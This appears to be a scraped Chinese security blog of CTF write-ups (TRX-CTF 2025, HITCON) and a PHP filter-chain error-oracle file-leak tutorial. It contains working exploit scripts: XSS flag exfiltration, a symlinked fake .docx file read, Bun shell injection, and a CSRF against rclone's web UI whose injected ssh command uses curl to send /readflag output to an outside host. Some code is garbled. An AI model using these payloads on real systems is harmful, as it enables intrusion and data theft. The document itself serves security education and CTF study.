\u0026#34;\u0026lt;%= payload %\u0026gt;\u0026#34;; document.body.appendChild(d); \u0026lt;/script\u0026gt; 然后这里我觉得有必要说一下关于Shadow DOM方面的一些知识点。 因为我们可以看到其实从始至终flag都没有被渲染到可视的页面内，那为什么我们最终能获取到flag?就是要Hacking Shadow DOM。\nShadow DOM 是 Web Components 技术的一部分，它允许你创建 封装的 DOM，从而使你能够将 HTML 结构、CSS 样式和 JavaScript 功能封装在一个独立的、隔离的环境中。这使得组件的样式和功能不受外部页面的影响，也不影响外部页面。（GPT回答）\n而在iframe.ejs中有这么一行shadow.appendChild(flagElement);，也就是他把这个flag封装起来，也就是页面上是不会显示的，所以我们在传payload的时候就没办法利用正则来对页面内的flag进行获取。\n具体怎么攻击可以看这一篇。 https://blog.ankursundara.com/shadow-dom/ 所以我们可以利用window.find来指向他进行获取flag的操作。\n接着我们来看CSP和SandBox的位置\n.app.use((req, res, next) =\u0026gt; { .res.setHeader(\u0026#34;Content-Security-Policy\u0026#34;\u0026#34;Content-Security-Policy\u0026#34;, \u0026#34;default-src \u0026#39;none\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;; form-action \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;;\u0026#34;);); next ( ) }) 可以看到设置了策略script-src是unsafe-inline所以可以内联执行js 其他的，这里的default-src设置成了none,阻止页面加载任何外部资源。所以对于外带flag这里还需要绕过一下。\n\u0026lt; iframe srcdoc = \u0026#39;\u0026lt;%= include(\u0026#34;iframe\u0026#34;, { payload: payload }) %\u0026gt;\u0026#39; sandbox = \u0026#34;allow-scripts allow-same-origin\u0026#34; \u0026gt;\u0026lt;/ iframe \u0026gt; 这里设置了一个sandbox，但是还是限制了弹出新窗口。 具体绕过看这一篇： https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/\n所以我们可以利用top.document.body进行写入，然后在导航页写入xss，进行外带flag\n最终exp:\nImport httpx BASE = \u0026#34;http://localhost:1337\u0026#34; DEST = \u0026#34;\u0026#34;？#外带地址 Payroll = \u0026#39;\u0026#39;\u0026#39; \u0026lt;img src onerror=\u0026#34; window.flag = \u0026#39;TRX{\u0026#39;; for (let j = 0; j \u0026lt;= 60; j++) { for (let i = 32; i \u0026lt;= 126; i++) { let c = String. from CharCode(i); if(window.find(window.flag + c,true,false,true)) { window.flag += c; console.log(window.flag); to break; } } } top.document.body.innerHTML += \u0026#39;\u0026lt;img src onerror=`\u0026lt;\u0026lt;\u0026lt;DEST\u0026gt;\u0026gt;/flag?\u0026#39; +window.flag+\u0026#39;`\u0026gt;\u0026#39;; \u0026#34;\u0026gt; \u0026#39;\u0026#39;\u0026#39; payload = payload.replace(\u0026#34;\u0026lt;\u0026lt;DEST\u0026gt;\u0026gt;, DEST) payload = \u0026#39;\u0026#39;.join(f\u0026#39; \\\\ x{ord(c):02x}\u0026#39; for c in payload) print(BASE + \u0026#34;/? payload=\u0026#34; + payload) response = httpx.post(BASE + \u0026#34;/visit\u0026#34;, json={\u0026#34;payload\u0026#34; : payload}) print (response.text) 注意一下为了完整的将payload传输，我们需要hex一下。 最后外带\nzStego #\r简介\nModern day script kiddies like to encrypt their conversations using this weird \u0026quot;zlib\u0026quot; thing. I had literally never heard of it. Doesn't look safe, you say? Well, no one expects it so it works! I created this majestic tool to look for zlib-encrypted messages in Word documents, because I'm fascinated by this zlib-encryption everyone uses. (TRX script kiddies left a flag in /flag.txt) 进来后页面是一个文件上传和扫描功能 我们来看一下源码（主要片段）\n/* processing uploaded Word - valid document contains relationship table */ $zip = new ZipArchive(); $zipFilename = $_FILES[\u0026#39;input\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($zip-\u0026gt;open($zipFilename) !== true || $zip-\u0026gt;locateName(REL_FILENAME) === false) hellYeah(400, \u0026#39;File is not a valid Word document.\u0026#39;); //解析成SimpleXML对象 $relsDom = simplexml_load_string($zip-\u0026gt;getFromName(REL_FILENAME)); if ($relsDom === false) hellYeah(400, \u0026#39;Invalid object relationship table. Document may be corrupted.\u0026#39;); /* extract document\u0026#39;s \u0026#34;media\u0026#34; folder into a temporary directory */ $tmpDir = exec(\u0026#34;mktemp -d --tmpdir=/tmp/ zipXXXXXXXXX\u0026#34;); //创建临时目录，目录名随机 shell_exec(\u0026#34;unzip $zipFilename \\\u0026#34;word/media*\\\u0026#34; -d \\\u0026#34;$tmpDir\\\u0026#34;\u0026#34;); function cleanup($tmpDir) { shell_exec(\u0026#34;rm -rf $tmpDir\u0026#34;); } register_shutdown_function(\u0026#39;cleanup\u0026#39;, $tmpDir); // cleanup in the end chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; } } 所以我们的思路其实就是伪造一个docx文件，让他在file_get_content的时候把一个压缩后的flag.txt拿出来再放进decode一下即可。 但是这里要注意一下怎么去构造这个文件，用软链接使其media指向根目录去读取flag，这里直接贴exp吧\nimport os import zipfile import requests def ZipDir(inputDir, outputZip): \u0026#39;\u0026#39;\u0026#39;Zip up a directory and preserve symlinks and empty directories\u0026#39;\u0026#39;\u0026#39; zipOut = zipfile.ZipFile(outputZip, \u0026#39;w\u0026#39;, compression=zipfile.ZIP_DEFLATED) rootLen = len(os.path.dirname(inputDir)) def _ArchiveDirectory(parentDirectory): contents = os.listdir(parentDirectory) # store empty directories if not contents: # http://www.velocityreviews.com/forums/t318840-add-empty-directory-using-zipfile.html archiveRoot = parentDirectory[rootLen:].replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;).lstrip(\u0026#39;/\u0026#39;) zipInfo = zipfile.ZipInfo(archiveRoot+\u0026#39;/\u0026#39;) zipOut.writestr(zipInfo, \u0026#39;\u0026#39;) for item in contents: fullPath = os.path.join(parentDirectory, item) if os.path.isdir(fullPath) and not os.path.islink(fullPath): _ArchiveDirectory(fullPath) else: archiveRoot = fullPath[rootLen:].replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;).lstrip(\u0026#39;/\u0026#39;) if os.path.islink(fullPath): # http://www.mail-archive.com/python-list@python.org/msg34223.html zipInfo = zipfile.ZipInfo(archiveRoot) zipInfo.create_system = 3 # long type of hex val of \u0026#39;0xA1ED0000L\u0026#39;, # say, symlink attr magic... zipInfo.external_attr = 2716663808 zipOut.writestr(zipInfo, os.readlink(fullPath)) else: zipOut.write(fullPath, archiveRoot, zipfile.ZIP_DEFLATED) _ArchiveDirectory(inputDir) zipOut.close() def pack_payload(zip_filename): tmp_dir = \u0026#34;./tmp/\u0026#34; word_dir = os.path.join(tmp_dir, \u0026#34;word\u0026#34;) rels_dir = os.path.join(word_dir, \u0026#34;_rels\u0026#34;) media_symlink = os.path.join(word_dir, \u0026#34;media\u0026#34;) os.makedirs(rels_dir, exist_ok=True) # Create the document.xml.rels file with user-defined content rels_content = \u0026#34;\u0026#34;\u0026#34; \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/php://filter/read=zlib.deflate/resource=flag.txt\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; \u0026#34;\u0026#34;\u0026#34;.strip() with open(os.path.join(rels_dir, \u0026#34;document.xml.rels\u0026#34;), \u0026#34;w\u0026#34;) as f: f.write(rels_content) if not os.path.exists(media_symlink): os.symlink(\u0026#34;/\u0026#34;, media_symlink) zip_path = os.path.join(tmp_dir, zip_filename) ZipDir(tmp_dir, zip_path) return zip_path def upload_zip(zip_path, url): with open(zip_path, \u0026#39;rb\u0026#39;) as f: files = {\u0026#39;input\u0026#39;: (os.path.basename(zip_path), f, \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;)} response = requests.post(url, files=files) print(\u0026#34;Status:\u0026#34;, response.status_code) print(\u0026#34;Body:\u0026#34;, response.text) if __name__ == \u0026#34;__main__\u0026#34;: zip_filename = \u0026#34;output.docx\u0026#34; upload_url = \u0026#34;http://localhost:1337/upload.php\u0026#34; zip_path = pack_payload(zip_filename) upload_zip(zip_path, upload_url) 最后拿到flag ","date":"10 March 2025","externalUrl":null,"permalink":"/posts/trxctf-2025/","section":"Posts","summary":"","title":"TRX-CTF2025 复现","type":"posts"},{"content":"","date":"10 March 2025","externalUrl":null,"permalink":"/tags/upzip/","section":"Tags","summary":"","title":"Upzip","type":"tags"},{"content":"","date":"25 July 2024","externalUrl":null,"permalink":"/tags/filterchain/","section":"Tags","summary":"","title":"Filterchain","type":"tags"},{"content":"首发于奇安信攻防社区： https://forum.butian.net/share/3645\n前言 #\r师傅们在群里讨论出题的时候，发了一段没有返回的file_get_content出来，结果Goku师傅说可以利用侧信道来打，我寻思着咋打呢，于是去求学了，结果我倒是觉得不叫侧信道吧，我觉得只是通过filter的各种parsel来把flag或者信息leak出来。\ndemo1 #\r这里是说在DownUnder2022中有这样的一道题\n\u0026lt;?php file($_POST[0]); 他没有吧读取到的内容print出来，所以这个题似乎是0解。 具体怎么解的请听下面的讲解\nFile read with error-based oracle #\r这里基于的原理就是说在filter中走过滤器的话会有最大的size限制，所以就可以利用这个报错作为标志来把数据爆破出来 然后简要概括就是三个步骤：\n用iconv来不断encoding来增加长度从而触发memory error 用dechunk来确定第一个字符。 再利用iconv去不断爆破剩下的字符。 其实就是不断循环的过程，这个知识点其实很多都是和我前面写的filterchain有关系的。 OVERFLOWING THE MAXIMUM FILE SIZE #\r在利用php://filter的时候我们可以给他加入过滤器来获取编码后的内容等等操作,这里是利用一些filter的效果\n$ php -r \u0026#39;$string = \u0026#34;START\u0026#34;; echo strlen($string).\u0026#34;\\n\u0026#34;; 5 $ php -r \u0026#39;$string = \u0026#34;START\u0026#34;; echo strlen(iconv(\u0026#34;UTF8\u0026#34;, \u0026#34;UNICODE\u0026#34;, $string)).\u0026#34;\\n\u0026#34;;\u0026#39; 12 $ php -r \u0026#39;$string = \u0026#34;START\u0026#34;; echo strlen(iconv(\u0026#34;UTF8\u0026#34;, \u0026#34;UCS-4\u0026#34;, $string)).\u0026#34;\\n\u0026#34;;\u0026#39; 20 这里我们主要看一下USC-4这个，可以看到他把5个字节的内容给他转换成了20个长度的字节。并且还有一个USC-4LE的过滤器，他实现的效果是这样的。 可以看到我们执行了两次iconv后所有的字符都被提到最前面了当做单独的一行。 所以我们可以不断的利用USC-4LE来扩大容量来使得其溢出\n\u0026lt;?php $string = \u0026#34;delete\u0026#34;; for($i = 1; $i \u0026lt; 20 ;$i++){ $string = iconv(\u0026#34;UTF8\u0026#34;,\u0026#34;UCS-4LE\u0026#34;,$string); } ?\u0026gt; 可以看到zsh自动把这个进程删掉了。（这里其实就是溢出了他自动把进程kill了） 报错也可以是这样的\nFatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 83886144 bytes) in /tmp/iconv.php on line 6 这就满足了第一个条件了，就是我们要造成一次溢出（其实我认为就是作为一个回显来判断是否第一个字符满足某个过滤器，这样子就能一个个确定字符然后把内容leak出来）\nLEAKING THE FIRST CHARACTER OF THE FILE #\r学会这个之后我们就可以来开始利用dechunk来确定字符等等事情了。\n关于dechunk的用法。\n5\\r\\n (chunk length) Chunk\\r\\n (chunk data) f\\r\\n (chunk length) PHPfiltersrock!\\r\\n (chunk data) 然后我们来看一个例子\n$ echo \u0026#34;START\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; START $ echo \u0026#34;0TART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; $ echo \u0026#34;ATART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; $ echo \u0026#34;aTART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; $ echo \u0026#34;GTART\u0026#34; \u0026gt; /tmp/test $ php -r \u0026#39;echo file_get_contents(\u0026#34;php://filter/dechunk/resource=/tmp/test\u0026#34;);\u0026#39; GTART 可以看到这里只要是hexadecimal value：[0-9]、[a-f]、[A-F]开头的都被dechunk drop掉了，所以我们就可以利用这个来确定开头的是否是16进制字符。 也就是搭配上面的overflow，我们就可以确定是否是16进制开头的string了。但是要找到具体字符还要继续往下看‘\nRetrieving the leading character value #\rRetrieving [a-e] characters #\r首先我们就要来确定a-e字符的情况。 这里我们先来了解一下CP930或者叫X-IBM930 ASCII code：\nx0 x1 x2 x3 x4 x5 x6 [\u0026hellip;] xf [\u0026hellip;.] 6x ` a b c d e f [\u0026hellip;] o [\u0026hellip;.] CP930、X-IBM930\nx0 x1 x2 x3 x4 x5 x6 [\u0026hellip;] xf [\u0026hellip;] 6x - / a b c d e [\u0026hellip;] ? [\u0026hellip;] cx { A B C D E F [\u0026hellip;] [\u0026hellip;] fx 0 1 2 3 4 5 6 [\u0026hellip;] Ÿ 我们可以看到在X-IBM930中小写字母，大写字母和数字都是在不同索引上的，所以base64-encode就不会弄混。 来看个例子\n\u0026lt;?php $guess_char = \u0026#34;\u0026#34;; for ($i=1; $i \u0026lt;= 7; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars\u0026#34;; $filter = \u0026#34;php://filter/$guess_char/resource=/tmp/test\u0026#34;; echo \u0026#34;IBM-930 conversions : \u0026#34;.$i; echo \u0026#34;, First char value : \u0026#34;.file_get_contents($filter)[0].\u0026#34;\\n\u0026#34;; } 执行\n$ echo \u0026#39;aSTART\u0026#39; \u0026gt; /tmp/test $ php oracle.php IBM-930 conversions : 1, First char value : b IBM-930 conversions : 2, First char value : c IBM-930 conversions : 3, First char value : d IBM-930 conversions : 4, First char value : e IBM-930 conversions : 5, First char value : f IBM-930 conversions : 6, First char value : g IBM-930 conversions : 7, First char value : h 其中$remove_junk_chars是用于从链中删除不可打印的字符，$guess_char 用于应用 X-IBM-930 编解码器。最后，每次循环都会打印转换后的文件内容的第一个字符。\n然后我们来试试和前面构造error一样\n\u0026lt;?php $size_bomb = \u0026#34;\u0026#34;; for ($i = 1; $i \u0026lt;= 13; $i++) { $size_bomb .= \u0026#34;convert.iconv.UTF8.UCS-4|\u0026#34;; } $guess_char = \u0026#34;\u0026#34;; $index = 0; for ($i=1; $i \u0026lt;= 6; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars\u0026#34;; $filter = \u0026#34;php://filter/$guess_char|dechunk|$size_bomb/resource=/tmp/test\u0026#34;; file_get_contents($filter); echo \u0026#34;IBM-930 conversions : \u0026#34;.$i.\u0026#34;, the first character is \u0026#34;.\u0026#34;edcba\u0026#34;[$i-1].\u0026#34;\\n\u0026#34;; } 读者可以自行去运行。 通过这个得出结论是我们可以通过这一段来确定开头字母是a、b、c、d、e这几个字母（他会在这些字母之后报error）\n同样的我们用rot13可以判断n、o、p、q、r，\n\u0026lt;?php $string = \u0026#34;START\u0026#34;; $size_bomb = \u0026#34;\u0026#34;; for ($i = 1; $i \u0026lt;= 13; $i++) { $size_bomb .= \u0026#34;convert.iconv.UTF8.UCS-4|\u0026#34;; } $guess_char = \u0026#34;\u0026#34;; $index = 0; for ($i=1; $i \u0026lt;= 6; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars|\u0026#34;; $rot13filter = \u0026#34;string.rot13|\u0026#34;; $filter = \u0026#34;php://filter/$rot13filter$guess_char|dechunk|$size_bomb/resource=/tmp/test\u0026#34;; file_get_contents($filter); echo \u0026#34;IBM-930 conversions : \u0026#34;.$i.\u0026#34;, the first character is \u0026#34;.\u0026#34;rqpon\u0026#34;[$i-1].\u0026#34;\\n\u0026#34;; } Retrieving [0-9] characters #\r这里就用到base64编码和解码的知识，可以看看我之前写的filterchain 就行了。然后这里就写一个表总结一下 这样子就很容易知道是数字几了。\nRetrieving other letters #\r这个具体也是利用前面说的利用IBM和ASCII的特性区别来进行确定。 例如：Z在ASCII表示为0x5A，而在IBM-285中0x5A却表示! 然后转化为IBM-280他就会变成0x4F，然后0x4F又表示o在ASCII中，我们再用rot13来过滤一下他就会变成B，也就刚好是dechunk获取到的B了。 具体的就不用多说了吧。\nInvalid multi-bytes sequence explanation #\r\u0026lt;?php $size_bomb = \u0026#34;\u0026#34;; for ($i = 1; $i \u0026lt;= 20; $i++) { $size_bomb .= \u0026#34;convert.iconv.UTF8.UCS-4|\u0026#34;; } $guess_char = \u0026#34;\u0026#34;; $index = 0; for ($i=1; $i \u0026lt;= 6; $i++) { $remove_junk_chars = \u0026#34;convert.quoted-printable-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|convert.base64-encode|\u0026#34;; $guess_char .= \u0026#34;convert.iconv.UTF8.UNICODE|convert.iconv.UNICODE.CP930|$remove_junk_chars\u0026#34;; $swap_bits = \u0026#34;convert.iconv.UTF16.UTF16|convert.iconv.UCS-4LE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UCS-4LE.UCS-4|\u0026#34;; $filter = \u0026#34;php://filter/$swap_bits$guess_char|dechunk|$size_bomb/resource=/tmp/test\u0026#34;; file_get_contents($filter); echo \u0026#34;IBM-930 conversions : \u0026#34;.$i.\u0026#34;, the fifth character is \u0026#34;.\u0026#34;edcba\u0026#34;[$i-1].\u0026#34;\\n\u0026#34;; } 到这里基本上整个利用都讲完了。其实本质上就是利用过滤器的特性来不断确定最终字符。\n受影响的函数 #\rfile_get_contents readfile finfo-\u0026gt;file getimagesize md5_file hash_file sha1_file parse_ini_file parse_ini_file file copy file_put_contents (only target read only with this) stream_get_contents fgetsfread fgetc fgetcsv fpassthru fputs 然后也有工具可以直接利用 https://github.com/synacktiv/php_filter_chains_oracle_exploit\nreference： https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle\n","date":"25 July 2024","externalUrl":null,"permalink":"/posts/filterleak/","section":"Posts","summary":"","title":"filter中发生的leak","type":"posts"},{"content":"首发于先知社区： https://xz.aliyun.com/t/15130?time__1311=GqjxuQD%3DeewxlxGg2DyDmgtQm7SbmQ2YD\nEcho as a Service #\r这里先放出源码\nimport { $ } from \u0026#34;bun\u0026#34;;\rconst server = Bun.serve({\rhost: \u0026#34;0.0.0.0\u0026#34;,\rport: 1337,\rasync fetch(req) {\rconst url = new URL(req.url);\rif (url.pathname === \u0026#34;/\u0026#34;) {\rreturn new Response(`\r\u0026lt;p\u0026gt;Welcome to echo-as-a-service! Try it out:\u0026lt;/p\u0026gt;\r\u0026lt;form action=\u0026#34;/echo\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;msg\u0026#34; /\u0026gt;\r\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt;\r\u0026lt;/form\u0026gt;\r`.trim(), { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34; } });\r}\relse if (url.pathname === \u0026#34;/echo\u0026#34;) {\rconst msg = (await req.formData()).get(\u0026#34;msg\u0026#34;);\rif (typeof msg !== \u0026#34;string\u0026#34;) {\rreturn new Response(\u0026#34;Something\u0026#39;s wrong, I can feel it\u0026#34;, { status: 400 });\r}\rconst output = await $`echo ${msg}`.text();\rreturn new Response(output, { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34; } });\r}\r}\r});\rconsole.log(`listening on http://localhost:${server.port}`); 这里因为题目describe说要RCE所以这里直接能定位到\nconst output = await $`echo ${msg}`.text();\rreturn new Response(output, { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/plain\u0026#34; } });\r}\r}\r}); 这里通过bun的docs 对比一下当前版本和1.1.8版本在使用shell的区别\n当前 { \u0026#39;~\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\\\\\u0026#39; } 1.1.8 { \u0026#39;$\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;(\u0026#39;, \u0026#39;)\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;\\\u0026#34;\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\\\u0026#39;\u0026#39; } 可以看见可以进行subshell，并且可以利用\u0026lt;来写入文件 所以就这样\n/readflag give me the flag1\u0026lt;test 最终脚本\ncmd = [\u0026#39;/readflag\\tgive\\tme\\tthe\\tflag1\u0026lt;flag.sh\u0026#39;, \u0026#39;`sh\u0026lt;flag.sh`\u0026#39;] [print(__import__(\u0026#34;requests\u0026#34;).post(\u0026#34;http://192.168.174.128:32768/echo\u0026#34;, data={\u0026#39;msg\u0026#39;: cmd[x]}).text) for x in range(2)] 可以看到读到了。\nRClonE #\r题目描述\nRclone is a CLI that syncs your files to various cloud storage. But do you know it also have a built-in web UI? 然后这里我们主要看一下大概的逻辑 bot.js\nconst visit = async url =\u0026gt; {\rlet context = null\rtry {\rif (!browser) {\rconst args = [\u0026#39;--js-flags=--jitless,--no-expose-wasm\u0026#39;, \u0026#39;--disable-gpu\u0026#39;, \u0026#39;--disable-dev-shm-usage\u0026#39;]\rif (new URL(SITE).protocol === \u0026#39;http:\u0026#39;) {\rargs.push(`--unsafely-treat-insecure-origin-as-secure=${SITE}`)\r}\rbrowser = await puppeteer.launch({\rheadless: \u0026#39;new\u0026#39;,\rargs\r})\r}\rcontext = await browser.createBrowserContext()\rconst page1 = await context.newPage()\rawait page1.goto(LOGIN_URL)\rawait page1.close()\rconst page2 = await context.newPage()\rawait Promise.race([\rpage2.goto(url, {\rwaitUntil: \u0026#39;networkidle0\u0026#39;\r}),\rsleep(5000)\r])\rawait page2.close()\rawait context.close()\rcontext = null\r} catch (e) {\rconsole.log(e)\r} finally {\rif (context) await context.close()\r}\r} app.js\napp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\rres.send(INDEX_HTML)\r})\rapp.post(\u0026#39;/submit\u0026#39;, async (req, res) =\u0026gt; {\rconst { url } = req.body\rif (!url || !URL_CHECK_REGEX.test(url)) {\rreturn res.status(400).send(\u0026#39;Invalid URL\u0026#39;)\r}\rtry {\rconsole.log(`[+] Sending ${url} to bot`)\rawait visit(url)\rres.send(\u0026#39;OK\u0026#39;)\r} catch (e) {\rconsole.log(e)\rres.status(500).send(\u0026#39;Something is wrong...\u0026#39;)\r}\r}) 这里我们搭建起来环境 可以看到是一个传url的地方，这里盲猜一下是ssrf，因为一般都出现在这种请求当中，并且我们可以发现源码并没有对其做过滤。 这里我们用webhook测试一下 可以看到是做了一个请求的。 https://rclone.org/sftp/#sftp-ssh 然后通过这个rclone官网可以看见我们可以利用sftp去在ssh执行命令的。所以我们可以先创建一个远程的SFTP地址。 然后如果我们需要创建一个remote的SFTP服务，我们可以通过请求这个路由来进行创建http://xxxx:5527/config/creat\ncurl -X POST -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;my_sftp_remote\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;sftp\u0026#34;, \u0026#34;parameters\u0026#34;: {\u0026#34;host\u0026#34;: \u0026#34;sftp.example.com\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;password\u0026#34;}}\u0026#39; http://localhost:5572/config/create 这样子我们就可以创建一个remote，然后我们写成html可以这样\n\u0026lt;form action=\u0026#34;http://192.168.174.128:5572/config/create\u0026#34; method=\u0026#34;POST\u0026#34; id=\u0026#34;cfgform\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;yy\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;type\u0026#34; value=\u0026#34;sftp\u0026#34; /\u0026gt; \u0026lt;!-- https://github.com/rclone/rclone/blob/7b8bbe531e0f062254b2d8ffe1e6284cd62309f6/fs/config/rc.go#L150 will parse parameters using json.Unmarshal --\u0026gt; \u0026lt;input name=\u0026#34;parameters\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Create\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; cfgform.parameters.value = JSON.stringify({ // ssh: \u0026#39;bash -c \u0026#34;touch /tmp/pwned\u0026#34;\u0026#39; ssh: `bash -c \u0026#34;curl http://192.168.174.128:8080/submit -d url=http://${location.host}/flag?flag=$(/readflag)\u0026#34;` }) \u0026lt;/script\u0026gt; 然后后面的js是为了把ssh要执行的命令先写进去然后在后面访问的时候让他自动触发\n\u0026lt;form action=\u0026#34;http://192.168.174.128:5572/operations/list\u0026#34; method=\u0026#34;POST\u0026#34; id=\u0026#34;listform\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;fs\u0026#34; value=\u0026#34;yy:\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;remote\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Do List\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; cfgform.submit() setTimeout(() =\u0026gt; { listform.submit() }, 1500) \u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;/delay.php?seconds=5\u0026#34; /\u0026gt; \u0026lt;!-- hitcon{easy_peasy_rce_using_csrf_attacking_local_server} --\u0026gt; 这样子就会触发让他执行上面写的ssh命令然后把内容外带出来。\n然后另外一个队伍的wp是这么写的，因为rclone不出网所以利用二分法进去把flag leak出来\nimport requests import base64 import time url = \u0026#34;http://rclone.chal.hitconctf.com:30068/submit\u0026#34; # run it first # php -S 0.0.0.0:3000 exp.html exp1 = \u0026#34;\u0026#34;\u0026#34; \u0026lt;form id=\u0026#34;rce\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;http://rclone:5572/config/create\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;u\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;type\u0026#34; value=\u0026#34;webdav\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;parameters\u0026#34; value=\u0026#39;{{\u0026#34;bearer_token_command\u0026#34;:\u0026#34;{}\u0026#34;, \u0026#34;url\u0026#34;:\u0026#34;http://bot:8000\u0026#34;}}\u0026#39;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; rce.submit(); \u0026lt;/script\u0026gt; \u0026#34;\u0026#34;\u0026#34; exp2 = \u0026#34;\u0026#34;\u0026#34; \u0026lt;form id=\u0026#34;form\u0026#34; method=\u0026#34;post\u0026#34; action=\u0026#34;http://rclone:5572/operations/list\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;fs\u0026#34; value=\u0026#34;u:\u0026#34; /\u0026gt; \u0026lt;input 